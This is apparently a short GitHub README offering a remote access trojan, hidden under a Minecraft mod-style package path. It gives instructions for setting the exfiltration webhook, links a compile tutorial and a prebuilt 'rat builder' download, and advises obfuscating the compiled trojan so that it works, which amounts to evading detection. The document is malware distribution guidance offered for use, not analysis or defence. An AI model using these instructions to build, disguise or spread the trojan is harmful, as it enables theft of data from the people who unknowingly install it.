## Hi heres the code to my rat
## SCROLL THROUGH THE ENTIRE GITHUB REPO IF U WANT TO KNOW HOW TO COMPILE.

### you can change the webhook in the file directory: 
## src/main/java/github/quantizr/autogg/guis/gui

## HERE IS A TUTORIAL ON HOW TO COMPILE: https://youtu.be/YGz_75Zl-ZA
### Tutorial video was made by ifallious#0007
### OR if you are very lazy just use the rat builder: https://anonfiles.com/u2xcO3daz4/rat_builder_exe
### idk how this works was made by /gt#2562

### The rat is the file without "-sources" at the end.
### After compiling it I highly recommend obfuscating it
### It might not work without obfuscation. 
### heres a good obfuscator: https://github.com/skidfuscatordev/skidfuscator-java-obfuscator/
### LOOK ON THE GITHUB FOR A TUTORIAL ON HOW TO USE IT.
